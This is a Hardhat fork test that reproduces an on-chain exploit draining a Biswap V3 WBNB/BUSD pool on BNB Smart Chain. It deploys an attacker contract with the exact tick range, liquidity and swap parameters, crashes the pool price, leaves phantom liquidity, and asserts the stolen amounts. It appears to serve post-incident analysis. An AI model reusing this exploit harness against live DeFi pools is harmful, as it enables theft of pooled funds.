const { expect } = require("chai");
const { ethers, network } = require("hardhat");

// Optional end-to-end reproduction against the real BSC state.
//
// Set BSC_RPC_URL to an archive-capable BSC RPC endpoint and run:
//   npx hardhat test test/BiswapV3Burn.fork.test.js
//
// The fork is pinned to block 135526419, the block immediately before the
// exploit transaction 0x13b831...f78c. The transaction was the 17th
// transaction in block 135526420, but no earlier transaction in that block
// touched the victim pool, so the parent-block state is the correct starting
// point.

const RUN_FORK = Boolean(process.env.BSC_RPC_URL);

const POOL = "0xc83f96f87f586a858a14c89e16434460bac0b643";
const WBNB = "0xbb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c";
const BUSD = "0xe9e7cea3dedca5984780bafc599bd69add087d56";

const FORK_BLOCK = 135526419;

// The attacker passed the full 11,283 WBNB flash loan as the swap cap. The
// pool consumed 11,282.950792773071452601 WBNB and left the rest untouched.
const CRASH_CAP_X = 11_283n * 10n ** 18n;
const CRASH_PAID_X = 11_282_950_792_773_071_452_601n;
const CRASH_RECEIVED_Y = 50_993_978_909_612_723_586_687n;

const DESIRE_X = 11_283_277_957_284_066_035_619n;

const POOL_WBNB_AFTER = 9_999_999_836_223_139n;
const POOL_BUSD_AFTER = 81_501_165_597_941_276_329n;

(RUN_FORK ? describe : describe.skip)("Biswap V3 fork reproduction", function () {
  this.timeout(300_000);

  let pool;
  let wbnb;
  let busd;
  let attacker;
  let attackerAddress;
  let deployer;

  before(async function () {
    await network.provider.send("hardhat_reset", [
      {
        forking: {
          jsonRpcUrl: process.env.BSC_RPC_URL,
          blockNumber: FORK_BLOCK,
        },
      },
    ]);

    [deployer] = await ethers.getSigners();
    pool = await ethers.getContractAt("BiswapPoolV3", POOL);
    wbnb = await ethers.getContractAt("MockERC20", WBNB);
    busd = await ethers.getContractAt("MockERC20", BUSD);

    const Attacker = await ethers.getContractFactory("AttackBiswapBurn");
    attacker = await Attacker.deploy(
      POOL,
      WBNB,
      BUSD,
      -400050,
      -400000,
      4_847_000_000n,
      484_700_000n,
      10n,
      DESIRE_X,
      800_000
    );
    await attacker.waitForDeployment();
    attackerAddress = await attacker.getAddress();

    // The attacker contract wraps BNB into WBNB. Fund the deployer so it can
    // send the 11,300 BNB value used by the fork harness.
    await network.provider.send("hardhat_setBalance", [
      await deployer.getAddress(),
      "0x" + (12_000n * 10n ** 18n).toString(16),
    ]);
  });

  it("reproduces the on-chain drain against the real pool", async function () {
    const preState = await pool.state();
    expect(preState.currentPoint).to.equal(224_000n);
    expect(preState.liquidity).to.equal(0n);

    const prePoolY = await busd.balanceOf(POOL);

    await (await attacker.wrap({ value: 11_300n * 10n ** 18n })).wait();
    await (await attacker.crash(CRASH_CAP_X, -400_001)).wait();

    const crashedState = await pool.state();
    expect(crashedState.currentPoint).to.equal(-400_001n);
    expect(crashedState.liquidity).to.equal(0n);
    expect(await attacker.crashPaidX()).to.equal(CRASH_PAID_X);
    expect(await attacker.crashReceivedY()).to.equal(CRASH_RECEIVED_Y);

    await (await attacker.attack()).wait();

    expect(await attacker.mintPaidY()).to.equal(500n);
    expect(await attacker.swapPaidY()).to.equal(63_263n);
    expect(await attacker.collectedY()).to.equal(480n);
    expect(await attacker.swapReceivedX()).to.equal(DESIRE_X);

    const finalState = await pool.state();
    expect(finalState.currentPoint).to.equal(-394_508n);
    expect(finalState.liquidity).to.equal(4_847_000_000n);
    expect(finalState.liquidityX).to.equal(2_896_494_600n);

    // Position was fully removed, but the pool still believes 4.847e9
    // liquidity is active.
    const positionKey = ethers.solidityPackedKeccak256(
      ["address", "int24", "int24"],
      [attackerAddress, -400050, -400000]
    );
    const position = await pool.liquidity(positionKey);
    expect(position[1]).to.equal(0n);
    expect(finalState.liquidity).to.equal(4_847_000_000n);

    expect(await wbnb.balanceOf(POOL)).to.equal(POOL_WBNB_AFTER);
    expect(await busd.balanceOf(POOL)).to.equal(POOL_BUSD_AFTER);

    const grossY = prePoolY - POOL_BUSD_AFTER;
    expect(grossY).to.equal(CRASH_RECEIVED_Y - 500n + 480n - 63_263n);

    // The attacker keeps the flash-loan principal in this harness. On-chain,
    // 11,284.1283 WBNB was repaid to Pancake V3 and 440.0561 BUSD was swapped
    // for the WBNB shortfall, leaving a net profit of 50,553.9228 BUSD.
    const attackerWbnb = await wbnb.balanceOf(attackerAddress);
    const attackerBusd = await busd.balanceOf(attackerAddress);
    expect(attackerWbnb).to.equal(
      11_300n * 10n ** 18n - CRASH_PAID_X + DESIRE_X
    );
    expect(attackerBusd).to.equal(grossY);

    console.log("    real pool BUSD removed:", ethers.formatEther(grossY));
    console.log("    real pool WBNB after:  ", ethers.formatEther(POOL_WBNB_AFTER));
    console.log("    phantom liquidity:     ", finalState.liquidity.toString());
    console.log("    attacker WBNB:         ", ethers.formatEther(attackerWbnb));
    console.log("    attacker BUSD:         ", ethers.formatEther(attackerBusd));
  });
});
